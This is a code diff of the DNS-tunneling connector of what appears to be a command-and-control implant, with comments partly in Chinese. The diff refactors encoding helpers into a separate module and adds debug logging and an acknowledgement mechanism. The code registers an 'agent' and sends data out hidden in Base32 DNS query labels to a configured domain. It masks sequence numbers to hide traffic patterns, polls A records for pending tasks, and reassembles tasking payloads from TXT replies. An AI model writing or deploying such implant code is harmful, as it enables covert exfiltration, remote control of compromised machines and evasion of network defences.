@@ -1,4 +1,5 @@
 #include "ConnectorDNS.h"
+#include "DnsUtils.h"
 #include "Crypt.h"
 #include "utils.h"
 #include "ApiLoader.h"
@@ -6,103 +7,18 @@
 
 extern "C" int __cdecl _snprintf(char*, size_t, const char*, ...);
 
-static void ToHex32(ULONG value, CHAR out[9])
-{
-	static const CHAR hex[] = "0123456789abcdef";
-	for (int i = 7; i >= 0; --i) {
-		out[i] = hex[value & 0x0F];
-		value >>= 4;
-	}
-	out[8] = '\0';
-}
-
-static ULONG DnsBase32Encode(const BYTE* src, ULONG srcLen, CHAR* dst, ULONG dstSize)
-{
-	static const CHAR alphabet[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
-	ULONG bitBuffer = 0;
-	int   bitCount  = 0;
-	ULONG outLen    = 0;
-
-	for (ULONG i = 0; i < srcLen; ++i) {
-		bitBuffer = (bitBuffer << 8) | src[i];
-		bitCount += 8;
-		while (bitCount >= 5) {
-			bitCount -= 5;
-			if (outLen + 1 >= dstSize)
-				return 0;
-			ULONG index = (bitBuffer >> bitCount) & 0x1F;
-			dst[outLen++] = alphabet[index];
-		}
-	}
-
-	if (bitCount > 0) {
-		if (outLen + 1 >= dstSize)
-			return 0;
-		ULONG index = (bitBuffer << (5 - bitCount)) & 0x1F;
-		dst[outLen++] = alphabet[index];
-	}
-
-	if (outLen < dstSize)
-		dst[outLen] = '\0';
-	return outLen;
-}
-
-static void BuildQName(const CHAR* sid, const CHAR* op, ULONG seq, ULONG idx, const CHAR* dataLabel, const CHAR* domain, CHAR* out, ULONG outSize)
-{
-    CHAR seqHex[9];
-    CHAR idxHex[9];
-    // XOR Obfuscation to hide incremental patterns
-    ToHex32(seq ^ 0x39913991, seqHex);
-    ToHex32(idx ^ 0x39913991, idxHex);
-
-    // 如果没有 dataLabel，就用单个短 label 占位，避免出现 ".." 连续点
-	const CHAR* dataPart = (dataLabel && dataLabel[0]) ? dataLabel : "x";
-	const CHAR* domPart  = (domain && domain[0]) ? domain : "";
-
-	if (domPart[0])
-		_snprintf(out, outSize, "%s.%s.%s.%s.%s.%s", sid, op, seqHex, idxHex, dataPart, domPart);
-	else
-		_snprintf(out, outSize, "%s.%s.%s.%s.%s", sid, op, seqHex, idxHex, dataPart);
-}
-
-static int EncodeDnsName(const CHAR* host, BYTE* buf, int bufSize)
-{
-	// 把 "a.b.c" 变成 [1]a[1]b[1]c[0]
-	int len = 0;
-	const CHAR* p = host;
-	while (*p && len < bufSize - 1) {
-		const CHAR* labelStart = p;
-		int labelLen = 0;
-		while (*p && *p != '.' && len + 1 + labelLen < bufSize - 1) {
-			++p;
-			++labelLen;
-		}
-		if (labelLen == 0)
-			break;
-		buf[len++] = (BYTE)labelLen;
-		if (len + labelLen >= bufSize)
-			return -1;
-		memcpy(buf + len, labelStart, labelLen);
-		len += labelLen;
-		if (*p == '.')
-			++p;
-	}
-	if (len >= bufSize)
-		return -1;
-	buf[len++] = 0;
-	return len;
-}
+// ============================================================================
+// Helper: Select resolver from profile (first entry before comma/semicolon)
+// ============================================================================
 
 static void SelectResolver(const CHAR* raw, CHAR* out, size_t outSize)
 {
-	// Default to a public recursive resolver if nothing supplied.
 	const CHAR* def = "1.1.1.1";
 	if (!raw || !raw[0]) {
 		_snprintf(out, outSize, "%s", def);
 		return;
 	}
 
-	// Take the first token up to comma/semicolon/whitespace.
 	size_t i = 0;
 	while (raw[i] && i + 1 < outSize) {
 		CHAR c = raw[i];
@@ -163,7 +79,7 @@ static BOOL DnsQueryTxt(const CHAR* qname, const CHAR* resolverRaw, const CHAR* 
 	query[5] = 0x01; // QDCOUNT = 1
 
 	int offset = 12;
-	int nameLen = EncodeDnsName(qname, query + offset, sizeof(query) - offset - 4);
+	int nameLen = DnsEncodeName(qname, query + offset, sizeof(query) - offset - 4);
 	if (nameLen < 0) {
 		ApiWin->closesocket(s);
 		ApiWin->WSACleanup();
@@ -313,76 +229,11 @@ static BOOL DnsQueryTxt(const CHAR* qname, const CHAR* resolverRaw, const CHAR* 
 	return FALSE;
 }
 
-static BOOL BuildDataLabelsFromBytes(const BYTE* src, ULONG srcLen, ULONG labelSize, CHAR* out, ULONG outSize)
-{
-	if (!src || !srcLen || !out || !labelSize || labelSize > 63 || outSize == 0)
-		return FALSE;
-
-	CHAR encoded[2048];
-	memset(encoded, 0, sizeof(encoded));
-	ULONG encLen = DnsBase32Encode(src, srcLen, encoded, sizeof(encoded));
-	if (encLen == 0)
-		return FALSE;
-
-	ULONG written = 0;
-	ULONG i = 0;
-	while (i < encLen) {
-		ULONG chunk = labelSize;
-		if (chunk > encLen - i)
-			chunk = encLen - i;
-		if (written + chunk + 1 >= outSize) // +1 for dot or NUL
-			return FALSE;
-		memcpy(out + written, encoded + i, chunk);
-		written += chunk;
-		i += chunk;
-		if (i < encLen) {
-			out[written++] = '.';
-		}
-	}
-	if (written >= outSize)
-		return FALSE;
-	out[written] = '\0';
-	return TRUE;
-}
-
-static int Base64Decode(const CHAR* src, int srcLen, BYTE* dst, int dstMax)
-{
-    static const int decodeTable[] = {
-        -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
-        -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
-        -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63,
-        52, 53, 54, 55, 56, 57, 58, 59, 60, 61, -1, -1, -1, -1, -1, -1,
-        -1,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,
-        15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, -1, -1, -1, -1, -1,
-        -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
-        41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1
-    };
-
-    int i = 0;
-    int j = 0;
-    int val = 0;
-    int valb = -8;
-
-    for (i = 0; i < srcLen; i++) {
-        unsigned char c = src[i];
-        // Simple bounds check for table lookup
-        if (c > 127) continue;
-        int d = decodeTable[c];
-        if (d == -1) continue; // Skip invalid/padding
-
-        val = (val << 6) | d;
-        valb += 6;
-        if (valb >= 0) {
-            if (j < dstMax) dst[j++] = (BYTE)((val >> valb) & 0xFF);
-            valb -= 8;
-        }
-    }
-    return j;
-}
+// DnsBuildDataLabels and Base64Decode are now in DnsUtils.h/cpp
 
 ConnectorDNS::ConnectorDNS()
 {
-	// For now, just zero-initialized by the default member initializer list.
+	DnsDebugLog("[DNS] ConnectorDNS::ctor");
 }
 
 BOOL ConnectorDNS::SetConfig(ProfileDNS profile, BYTE* beat, ULONG beatSize)
@@ -461,6 +312,8 @@ BOOL ConnectorDNS::SetConfig(ProfileDNS profile, BYTE* beat, ULONG beatSize)
     }
 
     this->initialized = TRUE;
+    DnsDebugLogf("[DNS] SetConfig OK: sid=%s domain=%s pktSize=%lu labelSize=%lu", 
+                 this->sid, this->domain, this->pktSize, this->labelSize);
     return TRUE;
 }
 
@@ -506,6 +359,7 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
 
     // HI：第一次带 beat 的调用仍然沿用原始打包方式
     if (!this->hiSent && data && data_size) {
+        DnsDebugLogf("[DNS] HI: sending beat, size=%lu", data_size);
         // Base32 encoding expands data by ~1.6x. The total DNS QNAME length is limited to 253 bytes.
         // Subtracting domain and prefix overhead, we have about 150-180 chars for data labels.
         // 180 chars Base32 -> ~110 bytes raw data.
@@ -523,22 +377,24 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
         if (!encBuf)
             return;
         memcpy(encBuf, data, maxBuf);
-        if (!BuildDataLabelsFromBytes(encBuf, maxBuf, this->labelSize, dataLabel, sizeof(dataLabel))) {
+        if (!DnsBuildDataLabels(encBuf, maxBuf, this->labelSize, dataLabel, sizeof(dataLabel))) {
             MemFreeLocal((LPVOID*)&encBuf, maxBuf);
             return;
         }
         MemFreeLocal((LPVOID*)&encBuf, maxBuf);
 
-        BuildQName(this->sid, "www", this->seq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
+        DnsBuildQName(this->sid, "www", this->seq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
         BYTE tmp[512];
         ULONG tmpSize = 0;
         this->lastQueryOk = DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, tmp, sizeof(tmp), &tmpSize);
         if (this->lastQueryOk) {
             this->hiSent = TRUE;
+            DnsDebugLog("[DNS] HI: SUCCESS - agent registered");
         } else {
             if (this->hiRetries > 0) {
                 this->hiRetries--;
             }
+            DnsDebugLogf("[DNS] HI: FAILED, retries left=%lu", this->hiRetries);
         }
         return;
     }
@@ -546,6 +402,7 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
     // 之后所有有数据的调用视为 PUT，使用应用层分片：
     // frame = [4 bytes total_len][4 bytes offset][chunk...]
     if (data && data_size) {
+        DnsDebugLogf("[DNS] PUT: total=%lu bytes", data_size);
         const ULONG headerSize = 8;
         ULONG total = data_size;
         ULONG maxChunk = pkt;
@@ -590,13 +447,13 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
             memcpy(frame + headerSize, data + offset, chunk);
 
             memset(dataLabel, 0, sizeof(dataLabel));
-            if (!BuildDataLabelsFromBytes(frame, frameSize, this->labelSize, dataLabel, sizeof(dataLabel))) {
+            if (!DnsBuildDataLabels(frame, frameSize, this->labelSize, dataLabel, sizeof(dataLabel))) {
                 MemFreeLocal((LPVOID*)&frame, frameSize);
                 return;
             }
             MemFreeLocal((LPVOID*)&frame, frameSize);
 
-            BuildQName(this->sid, "cdn", seqForSend, this->idx, dataLabel, this->domain, qname, sizeof(qname));
+            DnsBuildQName(this->sid, "cdn", seqForSend, this->idx, dataLabel, this->domain, qname, sizeof(qname));
             BYTE tmp[512];
             ULONG tmpSize = 0;
             DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, tmp, sizeof(tmp), &tmpSize);
@@ -612,6 +469,7 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
         }
         // 记录本次上行总量，供自适应 sleep 使用
         this->lastUpTotal = total;
+        DnsDebugLogf("[DNS] PUT: completed, total=%lu bytes sent", total);
         return;
     }
 
@@ -626,13 +484,13 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
         if (!encBuf)
             return;
         memcpy(encBuf, this->hiBeat, retrySize);
-        if (!BuildDataLabelsFromBytes(encBuf, retrySize, this->labelSize, dataLabel, sizeof(dataLabel))) {
+        if (!DnsBuildDataLabels(encBuf, retrySize, this->labelSize, dataLabel, sizeof(dataLabel))) {
             MemFreeLocal((LPVOID*)&encBuf, retrySize);
             return;
         }
         MemFreeLocal((LPVOID*)&encBuf, retrySize);
 
-        BuildQName(this->sid, "www", this->seq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
+        DnsBuildQName(this->sid, "www", this->seq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
         BYTE tmp[512];
         ULONG tmpSize = 0;
         if (DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, tmp, sizeof(tmp), &tmpSize)) {
@@ -652,9 +510,21 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
     // 则先发送一个轻量级的 A 记录查询作为心跳。
     // - 如果 TS 返回 0.0.0.0 -> 无任务，直接返回（进入 Sleep）。
     // - 如果 TS 返回 非 0.0.0.0 -> 有任务，继续执行下面的 TXT 查询拉取数据。
+    // ACK 机制：在心跳 A 查询中携带 downAckOffset，告知服务器已确认接收的 offset。
     if (!this->downBuf && this->qtype[0] == 'T') { // starts with 'T' -> TXT
         CHAR qnameA[512];
-        BuildQName(this->sid, "api", this->seq + 1, this->idx, "", this->domain, qnameA, sizeof(qnameA));
+        // 编码 ACK offset 到 dataLabel：4字节 big-endian base32 编码
+        BYTE ackBytes[4];
+        ackBytes[0] = (BYTE)((this->downAckOffset >> 24) & 0xFF);
+        ackBytes[1] = (BYTE)((this->downAckOffset >> 16) & 0xFF);
+        ackBytes[2] = (BYTE)((this->downAckOffset >> 8) & 0xFF);
+        ackBytes[3] = (BYTE)((this->downAckOffset >> 0) & 0xFF);
+        CHAR ackLabel[16];
+        memset(ackLabel, 0, sizeof(ackLabel));
+        DnsBase32Encode(ackBytes, 4, ackLabel, sizeof(ackLabel));
+        DnsBuildQName(this->sid, "api", this->seq + 1, this->idx, ackLabel, this->domain, qnameA, sizeof(qnameA));
+        
+        DnsDebugLogf("[DNS] HEARTBEAT(A): seq=%lu ack_offset=%lu", this->seq + 1, this->downAckOffset);
         
         BYTE ipBuf[16];
         ULONG ipSize = 0;
@@ -664,33 +534,43 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
             // 检查是否为 0.0.0.0
             if (ipBuf[0] == 0 && ipBuf[1] == 0 && ipBuf[2] == 0 && ipBuf[3] == 0) {
                 // 无任务，更新 seq 并返回，让 MainAgent 继续 sleep
-                this->seq++; 
+                this->seq++;
+                DnsDebugLog("[DNS] HEARTBEAT: no tasks (0.0.0.0)");
+                // 重置 ACK offset 因为没有待下载的任务
+                this->downAckOffset = 0;
                 return;
             }
             // 有任务 (e.g. 0.0.0.1)，Fall through to TXT logic below
+            DnsDebugLogf("[DNS] HEARTBEAT: has tasks (IP=%u.%u.%u.%u)", 
+                         ipBuf[0], ipBuf[1], ipBuf[2], ipBuf[3]);
         } else {
             // A 记录查询失败（可能是丢包或被拦截），稳妥起见，本次跳过 TXT 查询，等待下次重试
             this->lastQueryOk = FALSE;
+            DnsDebugLog("[DNS] HEARTBEAT: A query FAILED");
             return;
         }
     }
 
     // 正常 GET (TXT)：从服务器获取包含 [total_len][offset][chunk] 头部的下行片段，
     // 在本地 downBuf 中重组，完整后再一次性交给 AgentMain。
-    BuildQName(this->sid, "api", ++this->seq, this->idx, "", this->domain, qname, sizeof(qname));
+    DnsBuildQName(this->sid, "api", ++this->seq, this->idx, "", this->domain, qname, sizeof(qname));
+    DnsDebugLogf("[DNS] GET(TXT): seq=%lu", this->seq);
     BYTE respBuf[1024];
     ULONG respSize = 0;
     if (DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, respBuf, sizeof(respBuf), &respSize) && respSize > 0) {
         this->lastQueryOk = TRUE;
+        DnsDebugLogf("[DNS] GET: received %lu bytes", respSize);
         // Check for simple ACK "OK"
         if (respSize == 2 && respBuf[0] == 'O' && respBuf[1] == 'K') {
+            DnsDebugLog("[DNS] GET: received OK ACK");
             return;
         }
 
         // Base64 Decode the response (Server sends Base64 to ensure binary safety over TXT)
         BYTE binBuf[1024];
-        int binLen = Base64Decode((const CHAR*)respBuf, respSize, binBuf, sizeof(binBuf));
+        int binLen = DnsBase64Decode((const CHAR*)respBuf, respSize, binBuf, sizeof(binBuf));
         if (binLen <= 0) {
+            DnsDebugLog("[DNS] GET: Base64 decode failed");
             return; // Invalid or empty payload
         }
 
@@ -708,6 +588,7 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
             offset |= ((ULONG)binBuf[6] << 8);
             offset |= ((ULONG)binBuf[7] << 0);
             ULONG chunkLen = binLen - headerSize;
+            DnsDebugLogf("[DNS] GET: chunk total=%lu offset=%lu len=%lu", total, offset, chunkLen);
             const ULONG maxDownloadSize = 4 << 20; // 4MB
             if (total > 0 && total <= maxDownloadSize && offset < total) {
                 if (!this->downBuf || this->downTotal != total) {
@@ -748,7 +629,13 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
                 ULONG n = end - offset;
                 memcpy(this->downBuf + offset, binBuf + headerSize, n);
                 this->downFilled += n;
+                // 更新 ACK offset - 记录已接收的最大连续 offset
+                this->downAckOffset = this->downFilled;
+                DnsDebugLogf("[DNS] GET: reassembly progress %lu/%lu (%.1f%%)", 
+                             this->downFilled, this->downTotal, 
+                             (float)this->downFilled * 100.0f / (float)this->downTotal);
                 if (this->downFilled >= this->downTotal) {
+                    DnsDebugLogf("[DNS] GET: reassembly COMPLETE, total=%lu bytes", this->downTotal);
                     // 解析会话头：[flags][orig_len_le]，然后将原始 payload 交给上层。
                     BYTE* finalBuf   = this->downBuf;
                     ULONG finalSize  = this->downTotal;
@@ -789,6 +676,9 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
                     this->downBuf    = NULL;
                     this->downTotal  = 0;
                     this->downFilled = 0;
+                    // 重置 ACK offset，任务下载完成
+                    this->downAckOffset = 0;
+                    DnsDebugLogf("[DNS] GET: task ready, size=%lu bytes", finalSize);
                 }
                 return;
             }
